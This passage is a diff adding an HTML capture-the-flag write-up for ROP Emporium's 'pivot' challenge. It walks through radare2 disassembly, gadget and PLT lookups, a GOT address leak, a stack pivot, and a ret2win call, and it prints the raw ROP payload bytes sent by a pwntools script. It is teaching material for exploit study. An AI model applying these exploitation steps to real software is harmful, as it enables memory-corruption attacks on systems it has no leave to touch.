+│           0x00000ae9      488d45d0       lea rax, [s]
+│           0x00000aed      4889c7         mov rdi, rax                ; const char *s
+│           0x00000af0      e83bfdffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x00000af5      488b45c8       mov rax, qword [stream]
+│           0x00000af9      4889c7         mov rdi, rax                ; FILE *stream
+│           0x00000afc      e83ffdffff     call sym.imp.fclose         ; int fclose(FILE *stream)
+│           0x00000b01      48c745c80000.  mov qword [stream], 0
+│           0x00000b09      bf00000000     mov edi, 0                  ; int status
+╰           0x00000b0e      e85dfdffff     call sym.imp.exit           ; void exit(int status)
+</code></pre>
+<ul>
+<li>It opens flag.txt and prints it out, so now we have a potential solution, which will involve looping back to the beginning of the program:
+<ul>
+<li>In the 1st input of the 1st program loop iteration we need to:
+<ul>
+<li>Call <code>foothold_function</code> from the PLT to resolve its memory address</li>
+<li>Print the resolved location of <code>foothold_function</code> by placing the GOT pointer into rdi and then immediately calling <code>puts</code> afterwards (note that we must capture this printed resolved address of <code>foothold_function</code> for use later)</li>
+<li>Return back the very start of the program, but this time we know the location of all the imported libpivot addresses because their positions are relative to the resolved address of <code>foothold_function</code></li>
+</ul>
+</li>
+<li>In the 2nd input of the 1st program loop iteration we place 40 bytes of padding (because the rbp value isn't important) then followed by our ROP chain that pivots the stack to where our 1st input is stored</li>
+<li>In the 1st input of the 2nd program loop iteration we can put anything here, as it won't be used</li>
+<li>In the 2nd input of the 2nd program loop iteration we place 40 bytes of padding (because the rbp value isn't important) then followed by the resolved address of <code>foothold_function</code> which we leaked in the 1st program loop iteration</li>
+</ul>
+</li>
+<li>With the plan in place, we just need memory addresses for <code>start</code>, <code>pop_rdi</code>, <code>puts_plt</code> and the address of <code>ret2win</code> relative to <code>foothold_function</code>, so quit radare2 then open the main ELF binary in radare2 again:</li>
+</ul>
+<blockquote>
+<p>$ <code>r2 -A ./pivot</code></p>
+</blockquote>
+<ul>
+<li>When we've just opened the binary in radare2 the seek point is already at the program's entry point <code>0x400760</code> (our <code>start</code> location to loop back to), which we can confirm using <code>ie</code>:</li>
+</ul>
+<blockquote>
+<p>[0x00400760]&gt; <code>ie</code></p>
+</blockquote>
+<pre><code>[Entrypoints]
+vaddr=0x00400760 paddr=0x00000760 haddr=0x00000018 hvaddr=0x00400018 type=program
+
+1 entrypoints
+</code></pre>
+<ul>
+<li>Now search for the <code>pop rdi</code> gadget, which we find out is at <code>0x400a33</code>:</li>
+</ul>
+<blockquote>
+<p>[0x00400760]&gt; <code>/R pop rdi</code></p>
+</blockquote>
+<pre><code>  0x00400a33                 5f  pop rdi
+  0x00400a34                 c3  ret
+</code></pre>
+<ul>
+<li>Then get the location of <code>puts</code> in the PLT, which we find out is at <code>0x4006e0</code>:</li>
+</ul>
+<blockquote>
+<p>[0x00400760]&gt; <code>ii ~ puts</code></p>
+</blockquote>
+<pre><code>2   0x004006e0 GLOBAL FUNC       puts
+</code></pre>
+<ul>
+<li>Lastly, quit radare2 and move on to the next section where we'll get the address of <code>ret2win</code> relative to <code>foothold_function</code></li>
+</ul>
+<h2 id="address-of-ret2win-relative-to-foothold_function"><a class="header" href="#address-of-ret2win-relative-to-foothold_function">Address of <code>ret2win</code> Relative to <code>foothold_function</code></a></h2>
+<ul>
+<li>We'll use <a href="https://www.man7.org/linux/man-pages/man1/nm.1.html"><code>nm</code></a> to find the offset</li>
+</ul>
+<blockquote>
+<p>$ <code>nm -D ./libpivot.so</code></p>
+</blockquote>
+<pre><code>[...]
+000000000000096a T foothold_function
+[...]
+0000000000000a81 T ret2win
+</code></pre>
+<ul>
+<li>0xa81-0x96a == 0x117 == 279</li>
+<li>i.e. resolved <code>foothold_function</code> address + 0x117 == <code>ret2win</code> address</li>
+<li>All the pieces of the puzzle have been collected, so just write a Python script to get the flag</li>
+</ul>
+<h2 id="python-script-to-get-the-flag"><a class="header" href="#python-script-to-get-the-flag">Python Script to Get the Flag</a></h2>
+<ul>
+<li>The <a href="./get_flag.py">get_flag.py</a> Python script (using <a href="https://github.com/Gallopsled/pwntools">Pwntools</a>) is included for reference. Run it from the same directory as the challenge files:</li>
+</ul>
+<blockquote>
+<p>$ <code>python get_flag.py</code></p>
+</blockquote>
+<pre><code>pivot by ROP Emporium
+x86_64
+
+Call ret2win() from libpivot
+The Old Gods kindly bestow upon you a place to pivot: 0x7f60a185ef10
+Stack pivot: 0x7f60a185ef10
+Send a ROP chain now and it will land there
+&gt; b' \x07@\x00\x00\x00\x00\x003\n@\x00\x00\x00\x00\x00@\x10`\x00\x00\x00\x00\x00\xe0\x06@\x00\x00\x00\x00\x00`\x07@\x00\x00\x00\x00\x00'
+Thank you!
+
+Now please send your stack smash
+&gt; b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x10\xf0\x85\xa1`\x7f\x00\x00\xbb\t@\x00\x00\x00\x00\x00\x10\xef\x85\xa1`\x7f\x00\x00\xbd\t@\x00\x00\x00\x00\x00'
+Thank you!
+foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot
+
+foothold_function address: 0x7f60a1a6196a
+b'\x90\x90\x90\x90\x90\x90\x90\x90'
+Thank you!
+
+Now please send your stack smash
+&gt; b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x90\x90\x90\x90\x90\x90\x90\x90\x81\x1a\xa6\xa1`\x7f\x00\x00'
+Thank you!
+ROPE{a_placeholder_32byte_flag!}
+</code></pre>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../../../rop_emporium/solutions/x86_64/06-fluff/index.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+                            <a rel="next" href="../../../../rop_emporium/solutions/x86_64/08-ret2csu/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../../../rop_emporium/solutions/x86_64/06-fluff/index.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+                    <a rel="next" href="../../../../rop_emporium/solutions/x86_64/08-ret2csu/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <script type="text/javascript">
+            window.playground_copyable = true;
+        </script>
+        <script src="../../../../elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../../../mark.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../../../searcher.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../../../clipboard.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../../../highlight.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../../../book.js" type="text/javascript" charset="utf-8"></script>
+
+        <!-- Custom JS scripts -->
+    </body>
+</html>
